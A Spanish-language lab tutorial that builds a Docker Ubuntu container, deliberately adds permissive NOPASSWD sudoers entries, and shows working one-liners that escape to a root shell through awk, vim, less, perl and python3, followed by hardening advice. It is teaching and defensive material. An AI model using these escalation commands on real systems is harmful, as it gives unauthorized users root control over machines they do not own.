
---
# Laboratorio de escalada de privilegios mediante sudoers

Este laboratorio práctico tiene como objetivo demostrar cómo una mala configuración en el archivo `/etc/sudoers` puede ser abusada para escalar privilegios en un sistema Linux.

---

## 1. Despliegue del contenedor y preparación del entorno

**Acción:**

```bash
docker pull ubuntu:latest
docker run -dit --name ubuntuServer ubuntu
docker exec -it ubuntuServer bash
````

**Resultado:**

```bash
root@<ID_CONTENEDOR>:/# 
```

**Explicación:**  
Desplegamos un contenedor basado en Ubuntu y accedemos con una shell como usuario root.

---

## 2. Instalación de herramientas necesarias

**Acción:**

```bash
apt update
apt install nano sudo -y
```

**Explicación:**  
Instalamos `nano` como editor de texto y `sudo`, que por defecto no viene instalado en la imagen básica de Ubuntu.

**Acción opcional: visualizar el archivo de configuración de sudoers:**

```bash
cat /etc/sudoers
```

**Resultado:**  

```bash
#
# This file MUST be edited with the 'visudo' command as root.
#
# Please consider adding local content in /etc/sudoers.d/ instead of
# directly modifying this file.
#
# See the man page for details on how to write a sudoers file.
#
Defaults	env_reset
Defaults	mail_badpass
Defaults	secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"

# This fixes CVE-2005-4890 and possibly breaks some versions of kdesu
# (#1011624, https://bugs.kde.org/show_bug.cgi?id=452532)
Defaults	use_pty

# This preserves proxy settings from user environments of root
# equivalent users (group sudo)
#Defaults:%sudo env_keep += "http_proxy https_proxy ftp_proxy all_proxy no_proxy"

# This allows running arbitrary commands, but so does ALL, and it means
# different sudoers have their choice of editor respected.
#Defaults:%sudo env_keep += "EDITOR"

# Completely harmless preservation of a user preference.
#Defaults:%sudo env_keep += "GREP_COLOR"

# While you shouldn't normally run git as root, you need to with etckeeper
#Defaults:%sudo env_keep += "GIT_AUTHOR_* GIT_COMMITTER_*"

# Per-user preferences; root won't have sensible values for them.
#Defaults:%sudo env_keep += "EMAIL DEBEMAIL DEBFULLNAME"

# "sudo scp" or "sudo rsync" should be able to use your SSH agent.
#Defaults:%sudo env_keep += "SSH_AGENT_PID SSH_AUTH_SOCK"

# Ditto for GPG agent
#Defaults:%sudo env_keep += "GPG_AGENT_INFO"

# Host alias specification

# User alias specification

# Cmnd alias specification

# User privilege specification
root	ALL=(ALL:ALL) ALL

# Members of the admin group may gain root privileges
%admin ALL=(ALL) ALL

# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# See sudoers(5) for more information on "@include" directives:

@includedir /etc/sudoers.d
```

Se muestra el contenido por defecto del archivo `/etc/sudoers`. No modificamos directamente este archivo salvo que estemos trabajando con cuidado y sepamos usar `visudo`.

---

## 3. Creación de usuarios

**Acción:**

```bash
useradd -d /home/Metahumo -s /bin/bash -m Metahumo
useradd -d /home/User2 -s /bin/bash -m User2
passwd Metahumo
passwd User2
```

**Resultado:**

```bash
drwxr-x--- 1 Metahumo Metahumo 54 Jun 14 13:57 Metahumo
drwxr-x--- 1 User2    User2    54 Jun 14 13:59 User2
```

**Explicación:**  
Creamos dos usuarios: `Metahumo` y `User2`, y les asignamos contraseñas para poder cambiar a sus sesiones.

---

## 4. Comprobación inicial de privilegios sudo

**Acción:**

```bash
su Metahumo
sudo -l
```

**Resultado:**

```bash
Sorry, user Metahumo may not run sudo on <hostname>.
```

**Explicación:**  
El usuario `Metahumo` no tiene ningún permiso asignado en el archivo sudoers, por eso no puede ejecutar nada con `sudo`.

---

## 5. Modificación del archivo sudoers

**Acción:**

```bash
exit  # Volvemos al usuario root
nano /etc/sudoers
```

Añadimos al final del archivo o en su apartado para tenerlo ordenado:

```bash
# User privilege specification
root	ALL=(ALL:ALL) ALL
Metahumo ALL=(root) NOPASSWD: /usr/bin/awk     # Añadimos esta instrucción
```

Resultado: `sudo -l` como usuario `Metahumo` 

```bash
Matching Defaults entries for Metahumo on 72723e0a6904:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User Metahumo may run the following commands on 72723e0a6904:
    (root) NOPASSWD: /usr/bin/awk
```

**Explicación:**  
Le damos al usuario `Metahumo` el permiso de ejecutar el binario `/usr/bin/awk` como root, sin contraseña. Aunque awk parece inofensivo, puede ser explotado para obtener una shell privilegiada.

---

## 6. Abusando del permiso sudo con `awk`

**Acción:** 

```bash
sudo awk 'BEGIN {system("/bin/bash")}'
```

**Resultado:**

```bash
root@<hostname>:/home/Metahumo#
```

**Explicación:**  
Hemos obtenido una shell como root gracias a la ejecución de `awk` permitida por sudo. Esto demuestra cómo incluso comandos aparentemente inocuos pueden representar un riesgo si no se gestionan correctamente.

---

## 7. Conclusión y recomendaciones

- El uso de `NOPASSWD` debe restringirse al mínimo indispensable.
    
- No debemos permitir comandos interpretables como `awk`, `perl`, `python`, `vim`, etc., sin entender sus implicaciones.
    
- Siempre debemos editar el archivo `/etc/sudoers` con el comando `visudo` para evitar errores de sintaxis.
    
- Es recomendable auditar regularmente los permisos otorgados por `sudo`.
    

---

## 8. Abusando de permisos sudo con `vim`

**Acción (como root):**

```bash
nano /etc/sudoers
````

Añadir:

```bash
Metahumo ALL=(ALL) NOPASSWD: /usr/bin/vim
```

**Explicación:**  
Permitimos que el usuario `Metahumo` pueda ejecutar `vim` como superusuario sin necesidad de contraseña.

**Acción (como Metahumo):**

```bash
su Metahumo
sudo vim -c '!bash'
```

**Resultado:**

```bash
root@<hostname>:/home/Metahumo#
```

**Explicación:**  
Con la opción `-c '!bash'` le pedimos a `vim` que ejecute directamente un comando en el sistema con privilegios de root, accediendo así a una shell privilegiada.

---

## 9. Abusando de permisos sudo con `less`

**Acción (como root):**

```bash
nano /etc/sudoers
```

Añadir:

```bash
Metahumo ALL=(ALL) NOPASSWD: /usr/bin/less
```

**Explicación:**  
Permitimos la ejecución del binario `less` como root. Aunque `less` parece solo un visor de archivos, puede invocar comandos externos.

**Acción (como Metahumo):**

```bash
su Metahumo
sudo less /etc/hosts
```

Dentro de `less`, pulsamos `!` y escribimos:

```
!/bin/bash
```

**Resultado:**

```bash
root@<hostname>:/home/Metahumo#
```

**Explicación:**  
Dentro de `less`, el símbolo `!` permite ejecutar comandos del sistema. Al estar ejecutando `less` con permisos de root, la shell resultante también tiene esos privilegios.

---

## 10. Abusando de permisos sudo con `perl`

**Acción (como root):**

```bash
nano /etc/sudoers
```

Añadir:

```bash
Metahumo ALL=(ALL) NOPASSWD: /usr/bin/perl
```

**Explicación:**  
Permitimos que el usuario `Metahumo` pueda ejecutar `perl` como superusuario.

**Acción (como Metahumo):**

```bash
su Metahumo
sudo perl -e 'exec "/bin/bash";'
```

**Resultado:**

```bash
root@<hostname>:/home/Metahumo#
```

**Explicación:**  
Utilizamos Perl para ejecutar directamente una shell (`/bin/bash`). Al estar bajo `sudo`, esta shell hereda privilegios de root.

---

## 11. Abusando de permisos sudo con `python`

**Acción (como root):**

```bash
nano /etc/sudoers
```

Añadir:

```bash
Metahumo ALL=(ALL) NOPASSWD: /usr/bin/python3
```

**Explicación:**  
Permitimos ejecutar Python como superusuario. Python tiene capacidad para abrir shells, manipular archivos del sistema y más.

**Acción (como Metahumo):**

```bash
su Metahumo
sudo python3 -c 'import os; os.system("/bin/bash")'
```

**Resultado:**

```bash
root@<hostname>:/home/Metahumo#
```

**Explicación:**  
Aprovechamos Python para lanzar una shell (`bash`) con permisos de superusuario, usando la función `os.system`.

---

## 12. Conclusiones generales

Estos ejemplos demuestran cómo ciertos binarios que pueden parecer inofensivos son, en realidad, **vectores críticos de escalada de privilegios** si se incluyen de forma permisiva en el archivo `/etc/sudoers`.

**Recomendaciones:**

- No permitir el uso de intérpretes (`python`, `perl`) o editores avanzados (`vim`, `less`) vía `sudo` salvo casos totalmente controlados.
    
- Usar herramientas como [GTFOBins](https://gtfobins.github.io/) para conocer qué binarios pueden ser explotados bajo sudo.
    
- Auditar frecuentemente el archivo sudoers y sus derivados.
    
- Implementar mecanismos de detección y alerta de abuso de `sudo`.
    

---

